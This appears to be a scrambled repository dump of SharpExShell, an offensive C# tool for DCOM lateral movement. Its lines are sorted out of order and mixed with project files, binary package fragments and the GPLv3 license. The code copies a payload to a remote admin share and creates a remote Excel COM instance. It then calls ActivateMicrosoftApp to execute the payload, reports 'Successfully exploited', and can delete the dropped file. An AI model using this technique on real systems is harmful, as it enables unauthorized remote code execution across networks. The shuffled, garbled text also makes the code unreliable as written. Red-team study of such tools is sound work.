@@ -1,0 +1,1796 @@
+                            Preamble
+                       TERMS AND CONDITIONS
+                     END OF TERMS AND CONDITIONS
+                    CleanUp(DestinationFolder)
+                    Console.WriteLine()
+                    DestinationFolder 
+                    return
+                Console.WriteLine(e.Message)
+                ShowHelp(opts)
+                System.IO.File.Delete(DestinationFolder)
+                else
+                if (OpSec)
+                opts.Parse(args)
+                return
+                {
+                }
+            //Parsing the desitnation file supplied by user
+            Console.WriteLine()
+            How to Apply These Terms to Your New Programs
+            OptionSet opts = new OptionSet()
+            Thread.Sleep(1000)
+            bool OpSec = false
+            bool showhelp = false
+            catch (Exception e)
+            catch (OptionException e)
+            dynamic excelApp = Activator.CreateInstance(ComType)
+            else
+            if (showhelp 
+            opts.WriteOptionDescriptions(Console.Out)
+            return
+            return Activator.CreateInstance(ComType)
+            return excelApp
+            string ComputerName = null
+            string Method = null
+            string Payload = null
+            try
+            {
+            }
+        private static object NewMethod(Type ComType)
+        private static void CleanUp(String DestinationFolder)
+        private static void ShowHelp(OptionSet opts)
+        static void Main(string[] args)
+        {
+        }
+      </requestedPrivileges>
+      <HintPath>..
+    (at your option) any later version.
+    7.  This requirement modifies the requirement in section 4 to
+    </Reference>
+    </security>
+    </startup>
+    <AssemblyName>SharpExShell</AssemblyName>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <DebugType>pdbonly</DebugType>
+    <DefineConstants>DEBUG
+    <DefineConstants>TRACE</DefineConstants>
+    <Deterministic>true</Deterministic>
+    <ErrorReport>prompt</ErrorReport>
+    <FileAlignment>512</FileAlignment>
+    <LangVersion>7.3</LangVersion>
+    <Optimize>false</Optimize>
+    <Optimize>true</Optimize>
+    <OutputPath>bin
+    <OutputType>Exe</OutputType>
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <PlatformTarget>x64</PlatformTarget>
+    <Prefer32Bit>true</Prefer32Bit>
+    <ProjectGuid>{13C84182-2F5F-4EE8-A37A-4483E7E57154}</ProjectGuid>
+    <RootNamespace>SharpExShell</RootNamespace>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <WarningLevel>4</WarningLevel>
+    <one line to give the program's name and a brief idea of what it does.>
+    <program>  Copyright (C) <year>  <name of author>
+    <security>
+    <startup> 
+    Appropriate Legal Notices
+    Copyright (C) <year>  <name of author>
+    Corresponding Source along with the object code.  If the place to
+    Corresponding Source fixed on a durable physical medium
+    Corresponding Source from a network server at no charge.
+    Corresponding Source in the same way through the same place at no
+    Corresponding Source.  Regardless of what server hosts the
+    GNU General Public License for more details.
+    License to anyone who comes into possession of a copy.  This
+    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+    Notices displayed by works containing it
+    Source of the work are being offered to the general public at no
+    This program comes with ABSOLUTELY NO WARRANTY
+    This program is free software: you can redistribute it and/or modify
+    You should have received a copy of the GNU General Public License
+    a) Disclaiming warranty or limiting liability differently from the
+    a) The work must carry prominent notices stating that you modified
+    any liability that these contractual assumptions directly impose on
+    author attributions in that material or in the Appropriate Legal
+    authors of the material
+    available for as long as needed to satisfy these requirements.
+    b) Requiring preservation of specified reasonable legal notices or
+    b) The work must carry prominent notices stating that it is
+    but WITHOUT ANY WARRANTY
+    c) Convey individual copies of the object code with a copy of the
+    charge under subsection 6d.
+    class Program
+    clear directions next to the object code saying where to find the
+    copy of the Corresponding Source for all the software in the
+    customarily used for software interchange.
+    d) Convey the object code by offering access from a designated
+    d) Limiting the use for publicity purposes of names of licensors or
+    e) Declining to grant rights under trademark law for use of some
+    f) Requiring indemnification of licensors and authors of that
+    further charge.  You need not require recipients to copy the
+    invalidate such permission if you have separately received it.
+    it under the terms of the GNU General Public License as published by
+    long as you offer spare parts or customer support for that product
+    material by anyone who conveys the material (or modified versions of
+    may be on a different server (operated by you or a third party)
+    more than your reasonable cost of physically performing this
+    reasonable ways as different from the original version
+    regardless of how they are packaged.  This License gives no
+    released under this License and any conditions added under section
+    requiring that modified versions of such material be marked in
+    terms of sections 15 and 16 of this License
+    those licensors and authors.
+    under certain conditions
+    with subsection 6b.
+    work need not make them do so.
+    written offer to provide the Corresponding Source.  This
+    you inform other peers where the object code and Corresponding
+    {
+    }
+  0. Definitions.
+  1. Source Code.
+  10. Automatic Licensing of Downstream Recipients.
+  11. Patents.
+  12. No Surrender of Others' Freedom.
+  13. Use with the GNU Affero General Public License.
+  14. Revised Versions of this License.
+  15. Disclaimer of Warranty.
+  16. Limitation of Liability.
+  17. Interpretation of Sections 15 and 16.
+  2. Basic Permissions.
+  2023
+  3. Protecting Users' Legal Rights From Anti-Circumvention Law.
+  4. Conveying Verbatim Copies.
+  5. Conveying Modified Source Versions.
+  6. Conveying Non-Source Forms.
+  7. Additional Terms.
+  8. Termination.
+  9. Acceptance Not Required for Having Copies.
+  </ItemGroup>
+  </PropertyGroup>
+  </trustInfo>
+  <ItemGroup>
+  <PropertyGroup>
+  A compilation of a covered work with other separate and independent
+  All rights granted under this License are granted for the term of
+  Conveying under any other circumstances is permitted solely under
+  Developers that use the GNU GPL protect your rights with two steps:
+  Each version is given a distinguishing version number.  If the
+  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
+  If the Program specifies that a proxy can decide which future
+  If the disclaimer of warranty and limitation of liability provided
+  Later license versions may give you additional or different
+  No covered work shall be deemed part of an effective technological
+  Nothing in this License shall be construed as excluding or limiting
+  Some devices are designed to deny users access to install or run
+  Termination of your rights under this section does not terminate the
+  The Corresponding Source for a work in source code form is that
+  The Corresponding Source need not include anything that users
+  The Free Software Foundation may publish revised and/or new versions of
+  The GNU General Public License does not permit incorporating your program
+  The licenses for most software and other practical works are designed
+  The requirement to provide Installation Information does not include a
+  You are not required to accept this License in order to receive or
+  You may convey a covered work in object code form under the terms
+  You may convey verbatim copies of the Program's source code as you
+  You may not impose any further restrictions on the exercise of the
+  You may not propagate or modify a covered work except as expressly
+ //By default it will be uploaded here!!
+ //Excel CLSID
+ 9(X
+ Auto detect text files and perform LF normalization
+ BKrM
+ ComputerName == null 
+ ComputerName)
+ DestinationFolder 
+ Everyone is permitted to copy and distribute verbatim copies
+ IHc'
+ MSF 7.00
+ Meq
+ Method 
+ N5t
+ Option Parser.
+ Payload == null)
+ QDpOW
+ SharpExShell
+ SharpExShell automates the DCOM lateral movment technique which abuses ActivateMicrosoftApp method of Excel application.
+ To read the blog: https://posts.specterops.io/lateral-movement-abuse-the-power-of-dcom-excel-application-3c016d0d9922
+ Use KeyedCollection.this[string]
+ Visual Studio Version 16
+ and each file should have at least
+ and give all
+ args.Length == 0 
+ cx7
+ e.Message)
+ for details type 
+ it applies also to
+ section 10
+ text=auto
+ type 
+ without even the implied warranty of
+!K<Nu
+!NuGet.org Repository by Microsoft0
+!NuGet.org Repository by Microsoft1
+!bvS
+"                       Version 3, 29 June 2007"
+"                    Console.WriteLine(""["
+"                    dynamic excelApp = CreateCOMInstance(Payload, DestinationFolder, ComputerName)"
+"                    excelApp.Application.ActivateMicrosoftApp(""5"")"
+"                    excelApp.Application.ActivateMicrosoftApp(""6"")"
+"                    excelApp.Application.ActivateMicrosoftApp(""7"")"
+"                Console.Error.WriteLine(""[!] Remove file Failed: "" "
+"                Console.Error.WriteLine(""["
+"                Console.WriteLine(""[!] Use this command to remove file manually "
+"                DestinationFolder = $"""
+"                DestinationFolder = DestinationFolder.Replace(""localhost"", ComputerName)"
+"                DestinationFolder = DestinationFolder.Replace(':', '$')"
+"                else if (Method.ToLower() == ""project"")"
+"                else if (Method.ToLower() == ""scheduleplus"")"
+"                if (Method.ToLower() == ""foxpro"")"
+"                { ""d"
+"                { ""h"
+"                { ""m"
+"                { ""o"
+"                { ""p"
+"                { ""t"
+"            Console.WriteLine(""Available Commands:"")"
+"            Console.WriteLine(""["
+"            Console.WriteLine($""["
+"            Guid excelClsid = new Guid(""00020812-0000-0000-C000-000000000046"")"
+"            System.IO.File.Copy(Payload, DestinationFolder)"
+"            Type ComType = Type.GetTypeFromCLSID(excelClsid, ComputerName)"
+"            if (DestinationFolder.Contains("":"
+"            string DestinationFolder = @"""
+"        <requestedExecutionLevel level=""asInvoker"" uiAccess=""false""/>"
+"        <supportedRuntime version=""v4.0"" sku="".NETFramework,Version=v4.5"" />"
+"        private static object CreateCOMInstance(String Payload, String DestinationFolder, String ComputerName)"
+"      <requestedPrivileges xmlns=""urn:schemas-microsoft-com:asm.v3"">"
+"    ""keep intact all notices""."
+"    (including a physical distribution medium), accompanied by a"
+"    (including a physical distribution medium), accompanied by the"
+"    <Compile Include=""Program.cs"" />"
+"    <Compile Include=""Properties"
+"    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>"
+"    <None Include=""App.config"" />"
+"    <None Include=""packages.config"" />"
+"    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>"
+"    <Reference Include=""Microsoft.CSharp"" />"
+"    <Reference Include=""NDesk.Options, Version=0.2.1.0, Culture=neutral, processorArchitecture=MSIL"">"
+"    <Reference Include=""System"" />"
+"    <Reference Include=""System.Core"" />"
+"    <Reference Include=""System.Data"" />"
+"    <Reference Include=""System.Data.DataSetExtensions"" />"
+"    <Reference Include=""System.Net.Http"" />"
+"    <Reference Include=""System.Xml"" />"
+"    <Reference Include=""System.Xml.Linq"" />"
+"    Corresponding Source, you remain obligated to ensure that it is"
+"    License will therefore apply, along with any applicable section 7"
+"    This is free software, and you are welcome to redistribute it"
+"    This program is distributed in the hope that it will be useful,"
+"    a) Convey the object code in, or embodied in, a physical product"
+"    additional terms, to the whole of the work, and all its parts,"
+"    along with this program.  If not, see <https://www.gnu.org/licenses/>."
+"    alternative is allowed only occasionally and noncommercially, and"
+"    b) Convey the object code in, or embodied in, a physical product"
+"    c) Prohibiting misrepresentation of the origin of that material, or"
+"    c) You must license the entire work, as a whole, under this"
+"    conveying of source, or (2) access to copy the"
+"    copy the object code is a network server, the Corresponding Source"
+"    d) If the work has interactive user interfaces, each must display"
+"    e) Convey the object code using peer-to-peer transmission, provided"
+"    interfaces that do not display Appropriate Legal Notices, your"
+"    it) with contractual assumptions of liability to the recipient, for"
+"    it, and giving a relevant date."
+"    medium customarily used for software interchange, for a price no"
+"    model, to give anyone who possesses the object code either (1) a"
+"    only if you received the object code with such an offer, in accord"
+"    permission to license the work in any other way, but it does not"
+"    place (gratis or for a charge), and offer equivalent access to the"
+"    product that is covered by this License, on a durable physical"
+"    that supports equivalent copying facilities, provided you maintain"
+"    the Free Software Foundation, either version 3 of the License, or"
+"    trade names, trademarks, or service marks"
+"    written offer, valid for at least three years and valid for as"
+"  ""Additional permissions"" are terms that supplement the terms of this"
+"  ""Copyright"" also means copyright-like laws that apply to other kinds of"
+"  ""Installation Information"" for a User Product means any methods,"
+"  ""The Program"" refers to any copyrightable work licensed under this"
+"  ""This License"" refers to version 3 of the GNU General Public License."
+"  2023"")]"
+"  <Import Project=""$(MSBuildExtensionsPath)"
+"  <Import Project=""$(MSBuildToolsPath)"
+"  <PropertyGroup Condition="" '$(Configuration)"
+"  <PropertyGroup Condition=""'$(Configuration)"
+"  <assemblyIdentity version=""1.0.0.0"" name=""MyApplication.app""/>"
+"  <package id=""NDesk.Options"" version=""0.2.1"" targetFramework=""net45"" />"
+"  <trustInfo xmlns=""urn:schemas-microsoft-com:asm.v2"">"
+"  A ""Standard Interface"" means an interface that either is an official"
+"  A ""User Product"" is either (1) a ""consumer product"", which means any"
+"  A ""contributor"" is a copyright holder who authorizes use under this"
+"  A ""covered work"" means either the unmodified Program or a work based"
+"  A contributor's ""essential patent claims"" are all patent claims"
+"  A patent license is ""discriminatory"" if it does not include within"
+"  A separable portion of the object code, whose source code is excluded"
+"  Additional terms, permissive or non-permissive, may be stated in the"
+"  All other non-permissive additional terms are considered ""further"
+"  An ""entity transaction"" is a transaction transferring control of an"
+"  An interactive user interface displays ""Appropriate Legal Notices"""
+"  Corresponding Source conveyed, and Installation Information provided,"
+"  Each contributor grants you a non-exclusive, worldwide, royalty-free"
+"  Each time you convey a covered work, the recipient automatically"
+"  Finally, every program is threatened constantly by software patents."
+"  For example, if you distribute copies of such a program, whether"
+"  For the developers' and authors' protection, the GPL clearly explains"
+"  However, if you cease all violation of this License, then your"
+"  If conditions are imposed on you (whether by court order, agreement or"
+"  If the program does terminal interaction, make it output a short"
+"  If you add terms to a covered work in accord with this section, you"
+"  If you convey a covered work, knowingly relying on a patent license,"
+"  If you convey an object code work under this section in, or with, or"
+"  If you develop a new program, and you want it to be of the greatest"
+"  If, pursuant to or in connection with a single transaction or"
+"  In the following three paragraphs, a ""patent license"" is any express"
+"  Moreover, your license from a particular copyright holder is"
+"  Notwithstanding any other provision of this License, for material you"
+"  Notwithstanding any other provision of this License, you have"
+"  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY"
+"  The ""Corresponding Source"" for a work in object code form means all"
+"  The ""System Libraries"" of an executable work include anything, other"
+"  The ""source code"" for a work means the preferred form of the work"
+"  The GNU General Public License is a free, copyleft license for"
+"  The precise terms and conditions for copying, distribution and"
+"  To ""convey"" a work means any kind of propagation that enables other"
+"  To ""modify"" a work means to copy from or adapt all or part of the work"
+"  To ""propagate"" a work means to do anything with it that, without"
+"  To do so, attach the following notices to the program.  It is safest"
+"  To protect your rights, we need to prevent others from denying you"
+"  When we speak of free software, we are referring to freedom, not"
+"  When you convey a copy of a covered work, you may at your option"
+"  When you convey a covered work, you waive any legal power to forbid"
+"  You may charge any price or no price for each copy that you convey,"
+"  You may convey a work based on the Program, or the modifications to"
+"  You may make, run and propagate covered works that you do not"
+"  You should also get your employer (if you work as a programmer) or school,"
+" "" not found"")"
+" Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>"
+" for a GUI interface, you would use an ""about box""."
+" however, if the Program has interactive"
+" of this license document, but changing it is not allowed."
+" zzGh"""
+""", value => DestinationFolder =value },"
+"""0 0"
+"""Major Component"", in this context, means a major essential component"
+"""O5j9w"
+"""aggregate"" if the compilation and its resulting copyright are not"
+"""nkP@"
+"""recipients"" may be individuals or organizations."
+"""rm '"" "
+"%X{"""
+"(1) assert copyright on the software, and (2) offer you this License"
+"(if any) on which the executable work runs, or a compiler used to"
+"(kernel, window system, and so on) of the specific operating system"
+", =(_"""
+",'DItUW"
+",QsbsA"
+",g{wcnL}"
+"-8b,D"
+".NETFramework,Version=v4.5"
+".NETFramework,Version=v4.5.AssemblyAttributes.cs"
+".NETFramework,v4.5,AssemblyFoldersEx}"
+".netframework,version=v4.5.assemblyattributes.cs"
+"// COM, set the ComVisible attribute to true on that type."
+"// [assembly: AssemblyVersion(""1.0."
+"/_k,"
+"0$0"""
+"1(c) 2008 VeriSign, Inc. - For authorized use only1806"
+"11 of the WIPO copyright treaty adopted on 20 December 1996, or"
+"13l""2Z"
+"1u}"""
+"2[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Collections.Generic.List"
+"2[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]"
+"2[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]"
+"2[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]][]"
+"5_5lJ,[g"
+"9}{nq}A@W""w]"
+"<Project ToolsVersion=""15.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
+"<assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0"">"
+"><Relationships xmlns=""http://schemas.openxmlformats.org/package/2006/relationships""><Relationship Type=""http://schemas.microsoft.com/packaging/2010/07/manifest"" Target=""/NDesk.Options.nuspec"" Id=""Reed208cac7c74268"" /><Relationship Type=""http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties"" Target=""/package/services/metadata/core-properties/b509421ca6a848d282a3d6adaf5f424b.psmdcp"" Id=""R26f763017de24533"" /></Relationships>PK"
+"><Types xmlns=""http://schemas.openxmlformats.org/package/2006/content-types""><Default Extension=""rels"" ContentType=""application/vnd.openxmlformats-package.relationships"
+"><coreProperties xmlns:dc=""http://purl.org/dc/elements/1.1/"" xmlns:dcterms=""http://purl.org/dc/terms/"" xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns=""http://schemas.openxmlformats.org/package/2006/metadata/core-properties""><dc:creator>NDesk</dc:creator><dc:description>NDesk.Options is a callback-based program option parser for C"
+"ALL NECESSARY SERVICING, REPAIR OR CORRECTION."
+"AnyCPU' "">"
+"AssemblyInfo.cs"" />"
+"Component, and (b) serves only to enable use of the work with that"
+"ComputerName="", ""--ComputerName host.example.local, 192.168.1.10"", value => ComputerName = value },"
+"Corresponding Source of the work from the predecessor in interest, if"
+"DNDesk.Options, Version=0.2.1.0, Culture=neutral, PublicKeyToken=null"
+"DestinationFolder="", ""--DestinationFolder C:"
+"ECSPettings"":{""project:SharpExcelDcom"":{""SourceRepositor"
+"FOXPROW.exe"""
+"For more information on this, and how to apply and follow the GNU GPL, see"
+"GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE"
+"GNU General Public License, you may choose any version ever published"
+"H""Np,"
+"HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM ""AS IS"" WITHOUT WARRANTY"
+"IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF"
+"License and any other pertinent obligations, then as a consequence you may"
+"License will continue to apply to the part which is the covered work,"
+"License, you may add to a covered work material governed by the terms"
+"License.  Each licensee is addressed as ""you"".  ""Licensees"" and"
+"MJ!)a2""a"
+"Major Component, or to implement a Standard Interface for which an"
+"Method="", ""--Method FoxPro, SchedulePlus, Project"", value => Method = value },"
+"Microsoft Visual Studio Solution File, Format Version 12.00"
+"Microsoft.CSharp.targets"" />"
+"Microsoft.Common.props"" Condition=""Exists('$(MSBuildExtensionsPath)"
+"Microsoft.Common.props')"" />"
+"N""AB"
+"N,$pTV8H"
+"OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,"
+"OvtM,ou"
+"PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),"
+"Payload="", ""--Payload C:"
+"Program, unless a warranty or assumption of liability accompanies a"
+"Program.cs,ae27a6b0-e345-4288-96df-5eaf394ee369.000738"
+"Project(""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"") = ""SharpExShell"", ""SharpExShell"
+"Public License ""or any later version"" applies to it, you have the"
+"Public License instead of this License.  But first, please read"
+"SCHDPLUS.exe"""
+"SharpExShell.csproj"", ""{13C84182-2F5F-4EE8-A37A-4483E7E57154}"""
+"System Libraries, or general-purpose tools or generally available free"
+"System32"")"
+"THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY"
+"VeriSign, Inc.1"
+"W""j4o-!"
+"WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS"
+"WINPROJ.exe"""
+"[,W9yK"
+"[assembly: AssemblyCompany("""")]"
+"[assembly: AssemblyConfiguration("""")]"
+"[assembly: AssemblyCopyright(""Copyright "
+"[assembly: AssemblyCulture("""")]"
+"[assembly: AssemblyDescription("""")]"
+"[assembly: AssemblyFileVersion(""1.0.0.0"")]"
+"[assembly: AssemblyProduct(""SharpExShell"")]"
+"[assembly: AssemblyTitle(""SharpExShell"")]"
+"[assembly: AssemblyTrademark("""")]"
+"[assembly: AssemblyVersion(""1.0.0.0"")]"
+"[assembly: Guid(""13c84182-2f5f-4ee8-a37a-4483e7e57154"")]"
+"[assembly: global::System.Runtime.Versioning.TargetFrameworkAttribute("".NETFramework,Version=v4.5"", FrameworkDisplayName = "".NET Framework 4.5"")]"
+"[xp""Xy${"
+"] Attempted to execute the ActivateMicrosoftApp method"")"
+"] DCOM Failed: "" "
+"] Method name: "" "
+"] Successfully created an instance of Excel on "" "
+"] Successfully exploited!!"")"
+"] Successfully exploited!"")"
+"] Uploaded File was removed: {DestinationFolder}"")"
+"_""Pkb"
+"_7H""}C"
+"_EB""Em67"
+"_O""6.nn],6[N"
+"a computer network, with no transfer of a copy, is not conveying."
+"above cannot be given local legal effect according to their terms,"
+"actual knowledge that, but for the patent license, your conveying the"
+"actually uses, or expects or is expected to use, the product.  A product"
+"add to a covered work, you may (if authorized by the copyright holders of"
+"additional permissions on material, added by you to a covered work,"
+"additional terms that apply to those files, or a notice indicating"
+"agreement or commitment, however denominated, not to enforce a patent"
+"and control, on terms that prohibit them from making any copies of"
+"and which are not combined with it such as to form a larger program,"
+"any patent claim is infringed by making, using, selling, offering for"
+"apply only to part of the Program, that part may be used separately"
+"arrangement, you convey, or propagate by procuring conveyance of, a"
+"authors' sake, the GPL requires that modified versions be marked as"
+"available, or (2) arrange to deprive yourself of the benefit of the"
+"be similar in spirit to the present version, but may differ in detail to"
+"be treated as though they were included in this License, to the extent"
+"but the special requirements of the GNU Affero General Public License,"
+"by this License, of making, using, or selling its contributor version,"
+"calc.exe"", value => Payload = value },"
+"certain responsibilities if you distribute copies of the software, or if"
+"changed, so that their problems will not be attributed erroneously to"
+"combined work, and to convey the resulting work.  The terms of this"
+"commercial, industrial or non-consumer uses, unless such uses represent"
+"computer or modifying a private copy.  Propagation includes copying,"
+"consistent with the requirements of this License, to extend the patent"
+"contain the covered work, unless you entered into that arrangement,"
+"content, constitutes a covered work.  This License acknowledges your"
+"control those activities.  However, it does not include the work's"
+"convey, without conditions so long as your license otherwise remains"
+"conveyed by you (or copies made from those copies), or (b) primarily"
+"copyright holder, and you cure the violation prior to 30 days after"
+"copyright on the Program, and are irrevocable provided the stated"
+"covered work in a country, or your recipient's use of the covered work"
+"covered work is covered by this License only if the output, given its"
+"covered work, and grant a patent license to some of the parties"
+"covered work, you indicate your acceptance of this License to do so."
+"dMicrosoft.VisualStudio.CommonIDE, Version=16.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
+"distribution (with or without modification), making available to the"
+"e%,u"
+"earlier work or a work ""based on"" the earlier work."
+"exact copy.  The resulting work is called a ""modified version"" of the"
+"extent that warranties are provided), that licensees may convey the"
+"feature that (1) displays an appropriate copyright notice, and (2)"
+"finally terminates your license, and (b) permanently, if the copyright"
+"fixed term (regardless of how the transaction is characterized), the"
+"for a work that has been modified or installed by the recipient, or for"
+"for making modifications to it.  ""Object code"" means any non-source"
+"for you must do so exclusively on your behalf, under your direction"
+"form of a separately written license, or stated as exceptions"
+"free programs, and that you know you can do these things."
+"freedoms that you received.  You must make sure that they, too, receive"
+"from the Corresponding Source as a System Library, need not be"
+"gE-, "
+"give under the previous paragraph, plus a right to possession of the"
+"giving you legal permission to copy, distribute and/or modify it."
+"gratis or for a fee, you must pass on to the recipients the same"
+"help"", ""Show available options"", value => showhelp = value != null },"
+"hereafter acquired, that would be infringed by some manner, permitted"
+"if any, to sign a ""copyright disclaimer"" for the program, if necessary."
+"in a country, would infringe one or more identifiable patents in that"
+"in a fashion requiring copyright permission, other than the making of an"
+"in or on a volume of a storage or distribution medium, is called an"
+"in the business of distributing software, under which you make payment"
+"infringement under applicable copyright law, except executing it on a"
+"interfaces specified for a particular programming language, one that"
+"into a dwelling.  In determining whether a product is a consumer product,"
+"into proprietary programs.  If your program is a subroutine library, you"
+"license to downstream recipients.  ""Knowingly relying"" means you have"
+"linked subprograms that the work is specifically designed to require,"
+"mI,dM=a9"
+"machine-readable Corresponding Source under the terms of this License,"
+"make it effectively proprietary.  To prevent this, the GPL assures that"
+"make, use, sell, offer for sale, import and otherwise run, modify and"
+"menu, a prominent item in the list meets this criterion."
+"modification of the work as a means of enforcing, against the work's"
+"modified object code on the User Product (for example, the work has"
+"modified versions of the software inside them, although the manufacturer"
+"modify it is void, and will automatically terminate your rights under"
+"must place, in the relevant source files, a statement of the"
+"nGM,"
+"not accept this License.  Therefore, by modifying or propagating a"
+"not convey it at all.  For example, if you agree to terms that obligate you"
+"not impose a license fee, royalty, or other charge for exercise of"
+"of having them make modifications exclusively for you, or provide you"
+"of sections 4 and 5, provided that you also convey the"
+"of that license document, provided that the further restriction does"
+"of the GPL, as needed to protect the freedom of users."
+"opsec"", ""Removes the uploaded file"", value=> OpSec= value != null },"
+"or convey a specific copy of the covered work, then the patent license"
+"or household purposes, or (2) anything designed or sold for incorporation"
+"or that patent license was granted, prior to 28 March 2007."
+"organization, or merging organizations.  If propagation of a covered"
+"organization, or substantially all assets of one, or subdividing an"
+"otherwise) that contradict the conditions of this License, they do not"
+"owned or controlled by the contributor, whether already acquired or"
+"packaging a Major Component, but which is not part of that Major"
+"parties who would receive the covered work from you, a discriminatory"
+"parts of the General Public License.  Of course, your program's commands"
+"patent license for this particular work, or (3) arrange, in a manner"
+"patent license under the contributor's essential patent claims, to"
+"permission, would make you directly or secondarily liable for"
+"permissions.  However, no additional obligations are imposed on any"
+"possible use to the public, the best way to achieve this is to make it"
+"procedures, authorization keys, or other information required to install"
+"produce it from the Program, in the form of source code under the"
+"produce the work, or an object code interpreter used to run it."
+"product received by a particular user, ""normally used"" refers to a"
+"products.  If such problems arise substantially in other domains, we"
+"propagate that work, subject to this License.  You are not responsible"
+"provisionally, unless and until the copyright holder explicitly and"
+"public, and in some countries other activities as well."
+"publicly available network server or other readily accessible means,"
+"purposes of this definition, ""control"" includes the right to grant"
+"receive it, in any medium, provided that you conspicuously and"
+"received it, or any part of it, contains a notice stating that it is"
+"receives a license from the original licensors, to run, modify and"
+"receiving the covered work authorizing them to use, propagate, modify"
+"reinstated, you do not qualify to receive new licenses for the same"
+"remove any additional permissions from that copy, or from any part of"
+"requirement to continue to provide support service, warranty, or updates"
+"restriction, you may remove that term.  If a license document contains"
+"restrictions"" within the meaning of section 10.  If the Program as you"
+"rights granted or affirmed under this License.  For example, you may"
+"rights granted under this License, and you may not initiate litigation"
+"rights of fair use or other equivalent, as provided by copyright law."
+"sale, or importing the Program or any portion of it."
+"section 13, concerning interaction through a network will apply to the"
+"sk5uK_""_%o"
+"software for all its users.  We, the Free Software Foundation, use the"
+"software on general-purpose computers, but in those that do, we wish to"
+"source code form), and must require no special password or key for"
+"specifically for use in, a User Product, and the conveying occurs as"
+"standard defined by a recognized standards body, or, in the case of"
+"sue for patent infringement).  To ""grant"" such a patent license to a"
+"tangible personal property which is normally used for personal, family,"
+"terms of section 4, provided that you also meet all of these conditions:"
+"than the work as a whole, that (a) is included in the normal form of"
+"the ""copyright"" line and a pointer to where the full notice is found."
+"the Program, the only way you could satisfy both those terms and this"
+"the covered work, and you disclaim any intention to limit operation or"
+"the interface presents a list of user commands or options, such as a"
+"the library.  If this is what you want to do, use the GNU Lesser General"
+"the scope of its coverage, prohibits the exercise of, or is"
+"the source code needed to generate, install, and (for an executable"
+"the work, and the source code for shared libraries and dynamically"
+"the work, and under which the third party grants, to any of the"
+"them if you wish), that you receive source code or can get it if you"
+"these rights or asking you to surrender the rights.  Therefore, you have"
+"to copy, free of charge and under the terms of this License, through a"
+"to receive a copy likewise does not require acceptance.  However,"
+"to take away your freedom to share and change the works.  By contrast,"
+"typical or common use of that class of product, regardless of the status"
+"under those permissions, but the entire Program remains governed by"
+"unpacking, reading or copying."
+"use, which is precisely where it is most unacceptable.  Therefore, we"
+"users, your or third parties' legal rights to forbid circumvention of"
+"vG_,7"
+"versions of the GNU General Public License can be used, that proxy's"
+"violation by some reasonable means, this is the first time you have"
+"want it, that you can change the software or use pieces of it in new"
+"which are not part of the work.  For example, Corresponding Source"
+"with facilities for running those works, provided that you comply with"
+"work results from an entity transaction, each party to that"
+"work thus licensed is called the contributor's ""contributor version""."
+"work under this License, and how to view a copy of this License.  If"
+"work) run the object code and to modify the work, including scripts to"
+"works, such as semiconductor masks."
+"works, which are not by their nature extensions of the covered work,"
+"www.digicert.com1$0"""
+"x64'"">"
+"xml version=""1.0"" encoding=""UTF-8"" standalone=""yes"""
+"xml version=""1.0"" encoding=""utf-8"" "
+"xml version=""1.0"" encoding=""utf-8"""
+"xml"" /></Types>PK"
+"xml"" /><Default Extension=""nuspec"" ContentType=""application/octet"" /><Default Extension=""dll"" ContentType=""application/octet"" /><Default Extension=""psmdcp"" ContentType=""application/vnd.openxmlformats-package.core-properties"
+"y"":""nuget.org"",""ShowPreviewWindow"":true,""ShowDeprecatedFrameworkWindow"":true,""RemoveDependencies"":false,""ForceRemove"":false,""IncludePrerelease"":false,""SelectedFilter"":""All"",""DependencyBehavior"":""Lowest"",""FileConflictAction"":""PromptUser"",""OptionsExpanded"":false,""SortPropertyName"":""ProjectName"",""SortDirection"":""Ascending""}}}"
+"y""M7<"
+"your programs, too."
+"z[0"""
